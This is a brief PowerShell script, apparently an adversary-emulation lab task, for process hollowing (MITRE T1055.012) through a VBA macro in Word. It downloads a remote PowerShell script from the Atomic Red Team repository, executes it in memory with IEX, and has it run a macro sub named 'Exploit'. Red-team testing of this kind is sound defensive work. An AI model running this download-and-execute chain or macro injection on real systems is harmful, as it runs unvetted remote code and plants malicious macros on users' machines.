# By Threats Experts University
# Technique: T1055.012 - Process Hollowing
# Task:  RunPE via VBA
# Requirement/s: T1055.012-macrocode.txt from https://github.com/redcanaryco/atomic-redteam/master/atomics/T1055.012/src see documention for instructions.

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) 
Invoke-MalDoc -macroFile "C:\temp\macrocode2.txt" -officeProduct "Word" -sub "Exploit"